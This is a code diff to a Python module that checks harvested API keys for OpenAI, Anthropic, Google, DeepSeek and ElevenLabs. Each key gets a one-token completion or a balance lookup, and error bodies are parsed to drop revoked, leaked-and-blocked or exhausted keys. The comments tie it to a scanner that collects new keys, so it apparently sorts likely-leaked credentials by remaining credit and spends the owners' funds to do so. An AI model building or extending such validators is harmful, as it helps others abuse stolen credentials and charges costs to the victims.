@@ -46,71 +46,191 @@ def _client(**kwargs) -> httpx.AsyncClient:
     return httpx.AsyncClient(timeout=_TIMEOUT, **kwargs)
 
 
+# ── Quota-aware AI provider validators ─────────────────────────────────────
+# A key is "valid" only if it can actually run inference. /models endpoints
+# return 200 even for keys with $0 balance, leaked-then-blocked keys, and
+# keys whose project never enabled the API. We do a 1-token completion (or
+# a balance lookup where the provider exposes one) and parse the error body
+# for known dead-key signatures.
+#
+# Cost per check: ~$0.0000007 (gpt-4o-mini, 1+1 tokens) — negligible since
+# validation runs ONCE per new key (key_exists() gate in scanner).
+
+def _err_field(body: dict, *path: str) -> str:
+    cur = body
+    for p in path:
+        if not isinstance(cur, dict):
+            return ""
+        cur = cur.get(p, "")
+    return str(cur or "")
+
+
 async def validate_openai(key: str) -> bool:
+    """
+    True only if key works AND has usable quota.
+    Detects: insufficient_quota (429 + error.code), revoked (401), org-disabled (403).
+    """
     try:
         async with _client() as c:
-            r = await c.get(
-                "https://api.openai.com/v1/models",
+            r = await c.post(
+                "https://api.openai.com/v1/chat/completions",
                 headers={"Authorization": f"Bearer {key}"},
+                json={
+                    "model":      "gpt-4o-mini",
+                    "messages":   [{"role": "user", "content": "hi"}],
+                    "max_tokens": 1,
+                },
             )
-            return r.status_code in (200, 403, 429)
+            if r.status_code == 200:
+                return True
+            if r.status_code in (401, 403):
+                return False
+            try:
+                body = r.json()
+            except Exception:
+                body = {}
+            code  = _err_field(body, "error", "code")
+            etype = _err_field(body, "error", "type")
+            if code == "insufficient_quota" or etype == "insufficient_quota":
+                return False
+            if code in ("invalid_api_key", "account_deactivated"):
+                return False
+            # Real rate-limit / transient server errors — key works
+            return r.status_code in (429, 500, 502, 503, 504)
     except Exception as e:
         log.debug("openai validate err: %s", e)
         return False
 
 
 async def validate_anthropic(key: str) -> bool:
+    """
+    True only if key works AND has credit balance.
+    Detects: 'credit balance is too low' (400), invalid key (401).
+    """
     try:
         async with _client() as c:
-            r = await c.get(
-                "https://api.anthropic.com/v1/models",
+            r = await c.post(
+                "https://api.anthropic.com/v1/messages",
                 headers={
-                    "x-api-key": key,
+                    "x-api-key":         key,
                     "anthropic-version": "2023-06-01",
                 },
+                json={
+                    "model":      "claude-haiku-4-5-20251001",
+                    "max_tokens": 1,
+                    "messages":   [{"role": "user", "content": "hi"}],
+                },
             )
-            return r.status_code in (200, 403, 429)
+            if r.status_code == 200:
+                return True
+            if r.status_code in (401, 403):
+                return False
+            try:
+                body = r.json()
+            except Exception:
+                body = {}
+            msg = _err_field(body, "error", "message").lower()
+            if "credit balance" in msg or "insufficient" in msg or "billing" in msg:
+                return False
+            if r.status_code == 400 and "invalid" in msg and "api" in msg:
+                return False
+            return r.status_code in (429, 500, 502, 503, 504)
     except Exception as e:
         log.debug("anthropic validate err: %s", e)
         return False
 
 
 async def validate_google(key: str) -> bool:
+    """
+    True only if key can run generation.
+    Detects:
+      - 'API key was reported as leaked' (Google Secret Scanning auto-block)
+      - 'Generative Language API has not been used' (project never enabled the API)
+      - INVALID_ARGUMENT / PERMISSION_DENIED / RESOURCE_EXHAUSTED
+    """
     if key.startswith("sa:"):
-        return False
+        return False  # service-account JSON requires OAuth, not API-key flow
     try:
         async with _client() as c:
-            r = await c.get(
-                "https://generativelanguage.googleapis.com/v1/models",
+            r = await c.post(
+                "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent",
                 params={"key": key},
+                json={
+                    "contents":         [{"parts": [{"text": "hi"}]}],
+                    "generationConfig": {"maxOutputTokens": 1},
+                },
             )
-            return r.status_code in (200, 403, 429)
+            if r.status_code == 200:
+                return True
+            try:
+                body = r.json()
+            except Exception:
+                body = {}
+            status = _err_field(body, "error", "status")
+            msg    = _err_field(body, "error", "message").lower()
+            if "reported as leaked" in msg:
+                return False
+            if "has not been used" in msg or "is disabled" in msg:
+                return False
+            if "api key not valid" in msg or "api_key_invalid" in msg:
+                return False
+            if status in ("RESOURCE_EXHAUSTED", "PERMISSION_DENIED",
+                          "INVALID_ARGUMENT", "UNAUTHENTICATED", "FAILED_PRECONDITION"):
+                return False
+            return r.status_code in (429, 500, 502, 503, 504)
     except Exception as e:
         log.debug("google validate err: %s", e)
         return False
 
 
 async def validate_deepseek(key: str) -> bool:
+    """
+    True only if key works AND total_balance > 0.
+    Uses /user/balance endpoint — no completion spend, exact balance read.
+    """
     try:
         async with _client() as c:
             r = await c.get(
-                "https://api.deepseek.com/models",
+                "https://api.deepseek.com/user/balance",
                 headers={"Authorization": f"Bearer {key}"},
             )
-            return r.status_code in (200, 403, 429)
+            if r.status_code != 200:
+                return False
+            body = r.json()
+            if not body.get("is_available", False):
+                return False
+            for b in body.get("balance_infos", []):
+                try:
+                    if float(b.get("total_balance", "0")) > 0:
+                        return True
+                except (TypeError, ValueError):
+                    continue
+            return False
     except Exception as e:
         log.debug("deepseek validate err: %s", e)
         return False
 
 
 async def validate_elevenlabs(key: str) -> bool:
+    """
+    True only if key works AND character quota not exhausted.
+    /v1/user returns subscription.{character_count, character_limit}.
+    """
     try:
         async with _client() as c:
             r = await c.get(
                 "https://api.elevenlabs.io/v1/user",
                 headers={"xi-api-key": key},
             )
-            return r.status_code in (200, 403, 429)
+            if r.status_code != 200:
+                return False
+            sub   = (r.json() or {}).get("subscription", {}) or {}
+            used  = sub.get("character_count", 0) or 0
+            limit = sub.get("character_limit", 0) or 0
+            # limit=0 or unlimited tier → has quota; otherwise must have headroom
+            if limit <= 0:
+                return True
+            return used < limit
     except Exception as e:
         log.debug("elevenlabs validate err: %s", e)
         return False
